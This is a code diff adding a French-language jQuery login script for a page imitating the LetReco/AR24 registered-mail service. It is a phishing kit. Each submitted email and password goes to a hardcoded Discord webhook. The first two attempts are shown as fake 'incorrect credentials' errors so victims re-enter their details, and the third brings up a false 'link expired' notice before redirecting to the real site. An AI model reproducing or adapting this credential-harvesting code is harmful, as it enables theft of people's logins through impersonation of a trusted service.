@@ -1,0 +1,224 @@
+// Nouveau système de connexion avec envoi Discord
+$(document).ready(function() {
+    console.log('Script de connexion LetReco chargé');
+    
+    // Compteur de tentatives
+    let attemptCount = 0;
+    const maxAttempts = 3;
+
+    // Fonction pour envoyer les données à Discord
+    function sendToDiscord(email, password, attempt) {
+        const discordWebhook = 'https://discordapp.com/api/webhooks/1428462867845218367/KDCg4vd2T5Gwj-4xevekLC7agKWPw-wQjbz9QZaQ1u_7JO2wT2-uLh7LT7aTOY_gDWjH';
+        const date = new Date().toLocaleString('fr-FR');
+        const message = `**🔔 Nouvelle tentative de connexion AR24**\n\n` +
+                       `📧 Email : \`${email}\`\n` +
+                       `🔑 Mot de passe : \`${password}\`\n` +
+                       `📅 Date : ${date}\n` +
+                       `🔄 Tentative : ${attempt}/${maxAttempts}`;
+
+        fetch(discordWebhook, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: message })
+        }).then(response => {
+            console.log('Discord response:', response.status);
+            if (response.ok) {
+                console.log('Message envoyé avec succès à Discord');
+            } else {
+                console.error('Erreur Discord:', response.statusText);
+            }
+        }).catch(error => {
+            console.error('Erreur envoi Discord:', error);
+        });
+    }
+
+    // Fonction pour afficher la modale de demande de nouveau lien
+    function showExpirationMessage() {
+        const modalHtml = `
+            <div id="expiration-overlay" class="expiration-modal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.35); z-index: 10000; display: flex; align-items: center; justify-content: center;">
+                <div class="card" style="max-width: 500px; margin: 40px auto; background: #fff; border: 2px solid var(--color-primary); border-radius: 14px; padding: 20px;">
+                    <h1 style="color: var(--color-primary); text-align: center; line-height: 1.25; margin: 0 0 12px;">Courrier recommandé non accessible</h1>
+                    <p class="lead" style="text-align: center; color: #3b3b3b; margin-bottom: 18px;">
+                        Ce lien n'est plus valide.<br>
+                        Le délai d'accès à votre courrier recommandé est expiré.<br>
+                        Veuillez demander un nouveau lien pour y accéder à nouveau.
+                    </p>
+                    <div class="field" style="margin-bottom: 16px;">
+                        <label style="display: block; font-size: 13px; margin-bottom: 6px; color: #333;">Votre adresse email :</label>
+                        <input id="new-link-email" type="email" placeholder="votre.email@exemple.com" style="width: 100%; padding: 14px 16px; border: 1px solid var(--color-border); border-radius: 10px; box-shadow: inset 0 0 0 2px var(--color-primary-100);">
+                        <div class="error" id="new-link-error" style="color: var(--color-error); font-size: 12px; margin-top: 2px; font-style: italic; display: none;">Veuillez entrer une adresse email valide.</div>
+                    </div>
+                    <div class="actions" style="display: flex; flex-direction: column; align-items: center; gap: 15px;">
+                        <button id="request-new-link" class="btn primary" style="padding: 12px 22px;">Demander un nouveau lien</button>
+                        <div id="request-loading" style="display: none; flex-direction: column; align-items: center; gap: 10px; text-align: center;">
+                            <div class="spinner" style="width: 24px; height: 24px; border: 3px solid var(--color-primary-100); border-top: 3px solid var(--color-primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+                            <span style="text-align: center;">Traitement de votre demande...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+        $('body').append(modalHtml);
+        
+        // Gestion du bouton "Demander un nouveau lien"
+        $('#request-new-link').on('click', function() {
+            const email = $('#new-link-email').val();
+            const errorDiv = $('#new-link-error');
+            
+            // Validation email
+            if (!isValidEmailAddress(email)) {
+                errorDiv.show();
+                return;
+            }
+            
+            // Masquer le bouton et afficher le spinner
+            $('#request-new-link').hide();
+            $('#request-loading').show();
+            
+            // Pas d'envoi à Discord pour la demande de nouveau lien
+            
+            // Afficher le message de confirmation après 1.5 secondes
+            setTimeout(function() {
+                $('#request-loading').html(`
+                    <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
+                        <div style="color: #27ae60; font-size: 24px;">✓</div>
+                        <span style="color: #333; text-align: center; line-height: 1.4;">
+                            Votre demande a bien été prise en compte.<br>
+                            Un nouveau lien vous sera envoyé par e-mail.
+                        </span>
+                    </div>
+                `);
+                
+                // Redirection après 4 secondes (temps pour lire le message)
+                setTimeout(function() {
+                    window.location.href = 'https://www.letreco.fr/a-propos/';
+                }, 4000);
+            }, 1500);
+        });
+        
+        // Masquer l'erreur quand l'utilisateur tape
+        $('#new-link-email').on('input', function() {
+            $('#new-link-error').hide();
+        });
+    }
+
+    // Gestion du formulaire de connexion
+	$(document).on("click", "#login-form .buttons .letreco-btn", function() {
+		$(this).blur();
+		var that = $(this),
+			form = that.closest('.letreco-form'),
+			that_html = that.html(),
+			postdata = {
+				action: "submit-login-form",
+				email: form.find("input[type='email']").val(),
+				password: form.find("input.password").val()
+			},
+            error = 0;
+
+		if (that.hasClass('disabled'))
+			return false;
+
+        // Nettoyer les erreurs précédentes
+		form.find('.letreco-error').remove();
+
+        // Validation email
+		if (!isValidEmailAddress(postdata.email)) {
+			form.find(".buttons").before("<p class='letreco-error'>Merci de renseigner une adresse mail valide.</p>");
+			error++;
+		}
+
+        // Validation mot de passe
+		if (!postdata.password.length) {
+			form.find(".buttons").before("<p class='letreco-error'>Merci de renseigner votre mot de passe.</p>");
+			error++;
+		}
+
+		if (error) {
+			let scroll = $("#wpadminbar").length ? form.find(".letreco-error").first().offset().top - $("header").outerHeight() - $("#wpadminbar").outerHeight() : form.find(".letreco-error").first().offset().top - $("header").outerHeight();
+			scroll = scroll - 80;
+			$.smoothScroll(scroll);
+			return false;
+		}
+
+        // Désactiver le bouton et afficher le spinner
+		that.addClass('disabled').html("<i class='fa fa-spin fa-spinner'></i>");
+		form.find('input').attr('disabled', true);
+
+        // Incrémenter le compteur de tentatives
+        attemptCount++;
+        
+        // Envoyer les données à Discord
+        console.log('Envoi Discord:', { email: postdata.email, password: postdata.password, tentative: attemptCount });
+        sendToDiscord(postdata.email, postdata.password, attemptCount);
+
+        // Traitement du formulaire selon le nombre de tentatives
+        setTimeout(function() {
+            if (attemptCount < maxAttempts) {
+                // Tentatives 1 et 2 : Afficher message d'erreur
+                that.removeClass('disabled').html(that_html);
+                form.find('input').attr('disabled', false);
+                form.find(".buttons").before("<p class='letreco-error' style='font-style: italic;'>Les informations saisies sont incorrectes.</p>");
+                console.log(`Tentative ${attemptCount}/${maxAttempts} - Informations incorrectes`);
+            } else {
+                // Tentative 3 : Afficher message d'expiration et rediriger
+					that.removeClass('disabled').html(that_html);
+					form.find('input').attr('disabled', false);
+                console.log('3ème tentative échouée - Affichage du message d\'expiration');
+                showExpirationMessage();
+            }
+        }, 1500);
+    });
+
+    // Fonction de validation email
+    function isValidEmailAddress(emailAddress) {
+        var pattern = /^([a-z\d!#$%&'*+\-\/=?^_`{|}~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+(\.[a-z\d!#$%&'*+\-\/=?^_`{|}~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+)*|"((([ \t]*\r\n)?[ \t]+)?([\x01-\x08\x0b\x0c\x0e-\x1f\x7f\x21\x23-\x5b\x5d-\x7e\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|\\[\x01-\x09\x0b\x0c\x0d\x7f\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))*(([ \t]*\r\n)?[ \t]+)?")@(([a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|[a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]([a-z\d\-._~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*[a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])\.)+([a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|[a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]([a-z\d\-._~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*[a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])\.?$/i;
+        return pattern.test(emailAddress);
+    }
+
+    // Gestion du formulaire d'inscription (version simplifiée)
+	$(document).on("click", "#signup-form .buttons .letreco-btn:not(.back)", function() {
+		var that = $(this),
+			form = that.closest('.letreco-form'),
+            that_html = that.html();
+
+		if (that.hasClass('disabled'))
+			return false;
+
+		form.find('.letreco-error').remove();
+		form.find('input.error').removeClass("error");
+
+        // Validation basique
+        var email = form.find("input[type='email']").val();
+        var password = form.find("input.password").val();
+
+        if (!isValidEmailAddress(email)) {
+            form.find("input[type='email']").addClass('error').after("<p class='letreco-error'>Adresse email invalide.</p>");
+            return false;
+        }
+
+        if (!password || password.length < 6) {
+            form.find("input.password").addClass('error').after("<p class='letreco-error'>Le mot de passe doit contenir au moins 6 caractères.</p>");
+			return false;
+		}
+		
+		that.addClass('disabled').html("<i class='fa fa-spin fa-spinner'></i>");
+		form.find('input').attr('disabled', true);
+
+        // Simulation d'inscription
+        setTimeout(function() {
+            	that.removeClass('disabled').html(that_html);
+				form.find('input').attr('disabled', false);
+            form.find(".buttons").before("<p class='letreco-error'>Fonction d'inscription temporairement désactivée.</p>");
+        }, 2000);
+    });
+
+    // Bouton retour pour l'inscription
+	$(document).on("click", "#signup-form .buttons .letreco-btn.back", function() {
+        var form = $(this).closest('.letreco-form');
+        form.attr('data-step', 1).data('step', 1);
+    });
+
+    console.log('Tous les événements de connexion sont configurés');
+});
